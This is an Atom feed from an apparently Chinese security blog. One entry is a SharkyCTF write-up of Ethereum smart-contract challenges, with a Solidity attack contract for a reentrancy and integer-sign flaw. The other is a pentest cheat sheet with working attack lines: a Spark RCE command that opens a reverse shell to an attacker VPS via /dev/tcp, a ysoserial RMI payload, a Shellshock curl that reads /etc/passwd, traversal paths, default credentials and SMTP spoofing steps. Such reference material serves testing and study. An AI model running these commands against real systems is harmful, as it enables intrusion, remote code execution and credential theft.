<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="https://www.w3.org/2005/Atom">
  <title>Vorder-blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://vorders.me/"/>
  <updated>2020-05-11T13:57:45.179Z</updated>
  <id>http://vorders.me/</id>
  
  <author>
    <name>Vorder</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SharkyCTF 合约部分wp</title>
    <link href="http://vorders.me/2020/05/11/SharkyCTF-%E5%90%88%E7%BA%A6%E9%83%A8%E5%88%86wp/"/>
    <id>http://vorders.me/2020/05/11/SharkyCTF-%E5%90%88%E7%BA%A6%E9%83%A8%E5%88%86wp/</id>
    <published>2020-05-11T07:05:52.000Z</published>
    <updated>2020-05-11T13:57:45.179Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>近日空闲下来，尝试复现下ctf合约部分的一些题解，全当复习下以前所学知识</p></blockquote><h1 id="Ethereum"><a href="#Ethereum" class="headerlink" title="Ethereum"></a>Ethereum</h1><p>截止目前：<a href="ethereum.sharkyctf.xy">题目链接</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity = 0.4.25;</span><br><span class="line"></span><br><span class="line">contract Warmup &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function unlock() public payable &#123;</span><br><span class="line">        require(msg.value == 0.005 ether);</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public payable &#123;</span><br><span class="line">        require(!locked);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很简单，只要发送0.005 ether到目的合约就可以得到flag了</p><p><img src="https://i.loli.net/2020/05/11/ZEupHO8sh7feVDT.jpg" alt=""></p><h2 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity = 0.4.25;</span><br><span class="line"></span><br><span class="line">contract Logic &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bytes32 private passphrase = &quot;th3 fl4g 1s n0t h3r3&quot;;</span><br><span class="line">    </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claim(bytes32 _secret) public payable &#123;</span><br><span class="line">        require(msg.value == 0.05 ether &amp;&amp; _secret == passphrase);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二题则是发送0.05 ether和<strong>th3 fl4g 1s n0t h3r3</strong>字符串的bytes32值,使用如下函数转换下，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract string_test &#123;</span><br><span class="line">function stringToBytes32(string memory source) public pure returns (bytes32 result) &#123;</span><br><span class="line">    bytes memory tempEmptyStringTest = bytes(source);</span><br><span class="line">    if (tempEmptyStringTest.length == 0) &#123;</span><br><span class="line">        return 0x0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assembly &#123;</span><br><span class="line">        result := mload(add(source, 32))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/05/11/iaK2wprO36k8uIH.jpg" alt="2-2.jpg"></p><p>或者直接翻阅<a href="https://ropsten.etherscan.io/tx/0x670271fa1c5509ca69afcfbdd13e4ebeea2b8f7d331bc0546208830d4487c0ff#statechange" target="_blank" rel="noopener">etherscan</a>上的记录</p><p><img src="https://i.loli.net/2020/05/11/ZQgzAJFmDItVvR4.jpg" alt="2-1.jpg"></p><p>get flag : <code>shkCTF{sh4m3_0n_y0u_l1ttl3_byt3_f0f6145540ea8c6ee8067c}</code></p><h2 id="Guessing"><a href="#Guessing" class="headerlink" title="Guessing"></a>Guessing</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity = 0.4.25;</span><br><span class="line"></span><br><span class="line">contract Guessing &#123;</span><br><span class="line">    address public owner;    </span><br><span class="line">    bytes32 private passphrase;</span><br><span class="line">    </span><br><span class="line">    constructor(bytes32 _passphrase) public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        passphrase = keccak256(abi.encodePacked(_passphrase));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claim(bytes32 _secret) public payable &#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(_secret)) == passphrase);</span><br><span class="line">        owner = msg.sender; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题未直接给出passphrase值，但可以直接翻阅<a href="https://ropsten.etherscan.io/address/0xdec0935310fe0cd45f49fbb5f0d77ffd2dffd9d4#code" target="_blank" rel="noopener">etherscan</a>查看历史的传参记录，转换成string看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract bytes32ToString  &#123;</span><br><span class="line">    function bytes32ToString(bytes32 x) constant returns (string) &#123;</span><br><span class="line">    bytes memory bytesString = new bytes(32);</span><br><span class="line">    uint charCount = 0;</span><br><span class="line">    for (uint j = 0; j &lt; 32; j++) &#123;</span><br><span class="line">        byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));</span><br><span class="line">        if (char != 0) &#123;</span><br><span class="line">            bytesString[charCount] = char;</span><br><span class="line">            charCount++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bytes memory bytesStringTrimmed = new bytes(charCount);</span><br><span class="line">    for (j = 0; j &lt; charCount; j++) &#123;</span><br><span class="line">        bytesStringTrimmed[j] = bytesString[j];</span><br><span class="line">    &#125;</span><br><span class="line">    return string(bytesStringTrimmed);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到passphrase值，但本道传入为bytes32，所以直接填0x49276d2070723374747920737572332079307520627275743366307263336421就行<br><img src="https://i.loli.net/2020/05/11/aytY5xvOXrogWTI.jpg" alt="3-1.jpg"><br>get flag:<code>shkCTF{bl0ckch41n_c0uld_b3_h3lpfull_05b12d40c473800270981b}</code></p><h2 id="Multipass"><a href="#Multipass" class="headerlink" title="Multipass"></a>Multipass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity = 0.4.25;</span><br><span class="line"></span><br><span class="line">contract Multipass &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public money;</span><br><span class="line">    </span><br><span class="line">    mapping(address =&gt; int256) public contributions;</span><br><span class="line">    </span><br><span class="line">    bool public withdrawn;</span><br><span class="line">    </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        contributions[msg.sender] = int256(msg.value * 900000000000000000000);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        money = msg.value;</span><br><span class="line">        withdrawn = false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function gift() public payable &#123;</span><br><span class="line">        require(contributions[msg.sender] == 0 &amp;&amp; msg.value == 0.00005 ether);</span><br><span class="line">        contributions[msg.sender] = int256(msg.value) * 10;</span><br><span class="line">        money += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function takeSomeMoney() public &#123;</span><br><span class="line">        require(msg.sender == owner &amp;&amp; withdrawn == false);</span><br><span class="line">        uint256 someMoney = money/20;</span><br><span class="line">        if(msg.sender.call.value(someMoney)())&#123;</span><br><span class="line">            money -= someMoney;</span><br><span class="line">        &#125;</span><br><span class="line">        withdrawn = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function contribute(int256 _factor) public &#123;</span><br><span class="line">        require(contributions[msg.sender] != 0 &amp;&amp; _factor &lt; 10);</span><br><span class="line">        contributions[msg.sender] *= _factor;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function claimContract() public &#123;</span><br><span class="line">        require(contributions[msg.sender] &gt; contributions[owner]);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>require(msg.sender == owner &amp;&amp; withdrawn == false);</code>需要满足这2个条件才能拿到flag</p><p>这2个条件都在默认创建合约那，再进一步可以通过claimContract来改变合约主人-》那先要充钱需要钱包大于合约主人才能替换</p><p>此时我们看这里 contribute，传入factor小于10但没限制要大于0,</p><p><code>require(contributions[msg.sender] != 0 &amp;&amp; _factor &lt; 10);</code></p><p>结合简单粗暴的将钱包值与输入值相乘，也就是说我们传入2次负值，最后乘成一个超大值来大过合约主。</p><p><code>contributions[msg.sender] *= _factor;</code></p><p>最后还要匿名函数回调下，防止withdrawn变true，（ps：之前还以为不用管</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(msg.sender.call.value(someMoney)())&#123;</span><br><span class="line">            money -= someMoney;</span><br><span class="line">        &#125;</span><br><span class="line">withdrawn = true;</span><br></pre></td></tr></table></figure><p>按着上述思路，给出exp，（ps:start的时候注意填ether Value为0.00005，还有速度太感人了。还是自己手动加速gas来得快</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">contract attack &#123;    </span><br><span class="line">    address  attacker;</span><br><span class="line">    address  victim;</span><br><span class="line">    function attack() payable &#123;attacker = msg.sender;&#125;</span><br><span class="line">    function start(address _target)  payable &#123;</span><br><span class="line">        victim = _target;</span><br><span class="line">        victim.call.value(0.00005 ether)(bytes4(keccak256(&quot;gift()&quot;)));</span><br><span class="line">        victim.call(bytes4(keccak256(&quot;contribute(int256)&quot;)), -1000000000000);  </span><br><span class="line">        victim.call(bytes4(keccak256(&quot;contribute(int256)&quot;)), -1000000000000);  </span><br><span class="line">        victim.call(bytes4(keccak256(&quot;claimContract()&quot;)));  </span><br><span class="line">        victim.call(bytes4(keccak256(&quot;takeSomeMoney()&quot;)));  </span><br><span class="line">        &#125;</span><br><span class="line">    function remove()  &#123;</span><br><span class="line">        if (msg.sender == attacker)&#123;</span><br><span class="line">            selfdestruct(attacker); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () payable &#123;</span><br><span class="line">        if (msg.sender == victim) &#123;</span><br><span class="line">            victim.call(bytes4(keccak256(&quot;takeSomeMoney()&quot;)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get flag:<code>shkCTF{bl0ckch41n_c0uld_b3_h3lpfull_05b12d40c473800270981b}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;近日空闲下来，尝试复现下ctf合约部分的一些题解，全当复习下以前所学知识&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Ethereum&quot;&gt;&lt;a href=&quot;#Ethereum&quot; class=&quot;headerlink&quot; title=&quot;Ether
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>检测点备忘录</title>
    <link href="http://vorders.me/2019/12/16/%E6%A3%80%E6%B5%8B%E7%82%B9%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://vorders.me/2019/12/16/%E6%A3%80%E6%B5%8B%E7%82%B9%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2019-12-16T06:01:19.000Z</published>
    <updated>2020-05-11T03:29:46.540Z</updated>
    
    <content type="html"><![CDATA[<p><strong>由于之前知识索引文章记录的太长了，大多数也是新知识点的建立，绕过方式的记录。<br>所以新开一篇文章，来记录平时主机层面的检测点及检测方法</strong></p><h1 id="测试点-方法速查"><a href="#测试点-方法速查" class="headerlink" title="测试点/方法速查:"></a>测试点/方法速查:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">#opsnssl rc4 检测</span><br><span class="line">openssl s_client -connect xxx -cipher RC4</span><br><span class="line">nmap --script ssl-enum-ciphers -p  xx xxx</span><br><span class="line"></span><br><span class="line"># slow dos检测</span><br><span class="line">slowhttptest -c 1000 -X -g -o -slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://www.loveuv.net -p 3</span><br><span class="line"></span><br><span class="line">#nfs 检测 111</span><br><span class="line">rpcinfo 确定端口开放</span><br><span class="line">showmount -e xx.xx.xx.xx</span><br><span class="line">先apt-get install nfs-common</span><br><span class="line">https://www.freebuf.com/articles/network/159468.html</span><br><span class="line"></span><br><span class="line"># Oracle TNS Listener Remote Poisoning  检测</span><br><span class="line">msf里tnspoison_checker模块</span><br><span class="line"></span><br><span class="line">#ajp13 tomcat 8009上的ajp协议</span><br><span class="line">https://github.com/limkokhole/CVE-2011-3192 #dos攻击，慎测</span><br><span class="line"></span><br><span class="line"># java_rmi </span><br><span class="line">CVE-2019-12409</span><br><span class="line">https://www.4hou.com/web/15388.html</span><br><span class="line"></span><br><span class="line"># zookeeper未授权访问</span><br><span class="line">echo envi|nc xx.xx.xx 2181 </span><br><span class="line"></span><br><span class="line"># Dns域传送</span><br><span class="line">nmap --script dns-zone-transfer.nse --script-args &quot;dns-zone-transfer.domain=xxxxx.com&quot; -Pn -p 53 1.1.1.1</span><br><span class="line"></span><br><span class="line"># redis</span><br><span class="line">redis-cli -h xx.xx.xx.xx -p xx</span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"># zebra 2601、2604</span><br><span class="line">telnet  xxx 2601</span><br><span class="line">默认密码zebra</span><br><span class="line">en 切换特权模式</span><br><span class="line">show ip ospf route 显示路由</span><br><span class="line"></span><br><span class="line"># rexec 514 </span><br><span class="line">hydra-gtk 进行爆破</span><br><span class="line"></span><br><span class="line"># ms15-034 </span><br><span class="line">curl -k http://[host:port]/ -H &quot;Host: [host:port]&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;|grep &quot;Requested Range Not Satisfiable&quot;</span><br><span class="line"></span><br><span class="line"># spark 6066 8080 7077 8081</span><br><span class="line">https://github.com/aRe00t/rce-over-spark.git</span><br><span class="line">./submit.sh xxxxx:6066 2.3.0 https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar &quot;bash -i &gt;&amp; /dev/tcp/[vps]/2333 0&gt;&amp;1&quot;</span><br><span class="line">msf里的spark_unauth_rce</span><br><span class="line"></span><br><span class="line"># amqp  5672</span><br><span class="line">https://xz.aliyun.com/t/36</span><br><span class="line">https://github.com/m3ssap0/spring-break_cve-2017-8046</span><br><span class="line"></span><br><span class="line"># finger 79</span><br><span class="line">msf里finger_users模块，或finger -ls @xx.xx.xx.xx</span><br><span class="line">finger @xx.xx.xx.xx 是否有用户已登录</span><br><span class="line"></span><br><span class="line"># supervisor 9001</span><br><span class="line">CVE-2017-11610</span><br><span class="line">https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html</span><br><span class="line"></span><br><span class="line"># tomcat</span><br><span class="line">Apache Tomcat       &lt; 6.0.18 &apos;utf8&apos; Directory Traversal  cve-2008-2938（条件context.xml or server.xml allows &apos;allowLinking&apos;and &apos;URIencoding）</span><br><span class="line">&lt;6.0.19 xss /examples/jsp/cal/cal2.jsp?time=&quot; accesskey=x onclick=alert(1)</span><br><span class="line">/jsp-examples/cal/cal2.jsp?time=&quot; accesskey=x onclick=alert(1)</span><br><span class="line">【manger+version&lt;7】  /manger/html 爆破</span><br><span class="line">【PUT】 curl -X PUT http://xxxxxxx:port/test.jsp/ -d @- &lt; test.jsp</span><br><span class="line">&lt;% out.write(&quot;&lt;html&gt;&lt;body&gt;&lt;h3&gt;[+] hello&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;&quot;); %&gt;</span><br><span class="line">CVE-2016-8735       java -cp .\ysoserial.jar ysoserial.exploit.RMIRegistryExploit xx.xx.xx.xx 10001 Groovy1 &quot;cmd.exe /c curl xxxxx:2333&quot;</span><br><span class="line">CVE-2019-0232        curl -k &quot;http://localhost:8080/cgi-bin/hello.bat?&amp;C%3A%5CWindows%5CSystem32%5Cnet.exe+user&quot;  # windows、启用CGIServlet和enableCmdLineArguments（默认不启用）</span><br><span class="line"></span><br><span class="line"># apche </span><br><span class="line">curl &quot;http://localhost/jkstatus;&quot;</span><br><span class="line"></span><br><span class="line">cve-2019-0211 # &lt;2.4.17可以提权到root</span><br><span class="line"></span><br><span class="line"># hp ILO4 </span><br><span class="line">CVE-2017-12542      msf中admin/hp/hp_ilo_create_admin_account    https://www.freebuf.com/vuls/167124.html</span><br><span class="line">更多利用：https://github.com/airbus-seclab/ilo4_toolbox</span><br><span class="line"></span><br><span class="line"># vnc</span><br><span class="line">msf中的scanner/vnc/vnc_none_auth</span><br><span class="line">vncviewer xx.xx.xx.xx 进行连接</span><br><span class="line"></span><br><span class="line">#activemq</span><br><span class="line">- cve-2016-3088</span><br><span class="line">- CVE-2019-17571</span><br><span class="line">java -jar ysoserial-master.jar CommonsCollections5 &quot;curl http://127.0.0.1/ssrf/ssrf.php?rand=log4j&quot; &gt; log4j.curl.bin  </span><br><span class="line">nc 127.0.0.1 4560 &lt; log4j.curl.bin</span><br><span class="line"></span><br><span class="line">#iis 80</span><br><span class="line">msf上的windows/iis/iis_webdav_scstoragepathfromurl（需开启webdav服务的win2003）</span><br><span class="line">PUT写入漏洞</span><br><span class="line"></span><br><span class="line">#smtp 25</span><br><span class="line">smtp伪造，也可以使用swaks</span><br><span class="line">nc xxxxx.com 25</span><br><span class="line">EHLO qq.com</span><br><span class="line">MAIL FROM:admin@qq.com</span><br><span class="line">RCPT TO:test@test.com</span><br><span class="line">DATA</span><br><span class="line">&quot;内容&quot;</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line"></span><br><span class="line"># mysql</span><br><span class="line">&lt; 5.5.24 </span><br><span class="line">mysql_authbypass_hashdump</span><br><span class="line"></span><br><span class="line"># FreeSWITCH</span><br><span class="line">1.6.10 - 1.10.1</span><br><span class="line">multi/misc/freeswitch_event_socket_cmd_exec</span><br><span class="line"></span><br><span class="line"># Gemalto Sentinel License Manager  或者叫HASP LM</span><br><span class="line">目录穿越 http://localhost:1947/_int_/action.html?alpremove=/../../../../../../../meaning_of_life.txt</span><br><span class="line"></span><br><span class="line">#GlassFish </span><br><span class="line">目录穿越</span><br><span class="line">/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config</span><br><span class="line"></span><br><span class="line"># bash破壳漏洞</span><br><span class="line">curl -A &quot;() &#123; foo;&#125;;echo;/bin/cat /etc/passwd&quot; http://**.**.**.**/cgi-bin/test-cgi</span><br><span class="line"></span><br><span class="line"># rtmp</span><br><span class="line">vlc-网络串流-rtmp://ip:port/短地址/串流码 </span><br><span class="line"></span><br><span class="line">xx/admin/?c=session&amp;a=index</span><br><span class="line">密码重置（mu/d.u直播</span><br><span class="line"></span><br><span class="line"># HP System Management Homepage/hp smh </span><br><span class="line">hp_sys_mgmt </span><br><span class="line"></span><br><span class="line"># rexec</span><br><span class="line">rlogin -l root  xx.xx.xx.xx </span><br><span class="line">scanner/rservices/rlogin_login</span><br><span class="line">scanner/rservices/rexec_login</span><br><span class="line"></span><br><span class="line"># solr</span><br><span class="line"></span><br><span class="line"># spring Cloud </span><br><span class="line"></span><br><span class="line">/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd </span><br><span class="line">/foo/default/master/..(_)..(_)..(_)..(_)..(_)1.txt</span><br><span class="line"></span><br><span class="line"># harbor</span><br><span class="line"></span><br><span class="line">默认密码：Harbor12345 </span><br><span class="line">CVE-2019-16097</span><br><span class="line"></span><br><span class="line">#thinkphp</span><br><span class="line">rce THINKPHP 5.0.x-5.0.23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ueditor</span><br><span class="line">.net  1.4.3.3 和 1.5.0 getshell</span><br><span class="line">POST /ueditor/net/controller.ashx?action=catchimage</span><br><span class="line"></span><br><span class="line">source%5B%5D=http%3A%2F%2Fx.x.x.x/1.gif?.aspx</span><br><span class="line"></span><br><span class="line">#fastjson</span><br><span class="line">https://paper.seebug.org/1192/#fastjson_3</span><br><span class="line"></span><br><span class="line">#shiro</span><br><span class="line">反序列化 shiro-550,字节翻转攻击 721</span><br><span class="line">权限绕过cve-2020-1957 ,  /xxxx/..;/admin/index</span><br><span class="line"></span><br><span class="line"># xpose+xserver</span><br><span class="line">https://xz.aliyun.com/t/7669</span><br></pre></td></tr></table></figure><h1 id="端口渗透速查："><a href="#端口渗透速查：" class="headerlink" title="端口渗透速查："></a>端口渗透速查：</h1><table><thead><tr><th>端口</th><th>服务</th><th>测试方法</th></tr></thead><tbody><tr><td>22</td><td>ssh</td><td>CVE-2018-15473</td></tr><tr><td>23</td><td>telnet</td><td>telnet xx.xx.xx.xx [port]</td></tr><tr><td>25</td><td>SMTP</td><td>awks smtp伪造</td></tr><tr><td>42</td><td>wins</td><td>ms11-035(dos漏洞)</td></tr><tr><td>53</td><td>dns</td><td>nmap –script dns-zone-transfer.nse –script-args “dns-zone-transfer.domain=xxxxx.com” -Pn -p 53 1.1.1.1</td></tr><tr><td>79</td><td>finger</td><td>msf里finger_users模块，或finger -ls @xx.xx.xx.xx</td></tr><tr><td>85</td><td>深信服</td><td>无</td></tr><tr><td>110</td><td>pop3</td><td>无</td></tr><tr><td>111,1025</td><td>nfs</td><td>showmount -e xx.xx.xx.xx</td></tr><tr><td>389</td><td>ladp</td><td>注入，未授权</td></tr><tr><td>443</td><td>ssl</td><td>nmap –script ssl-enum-ciphers -p  xx 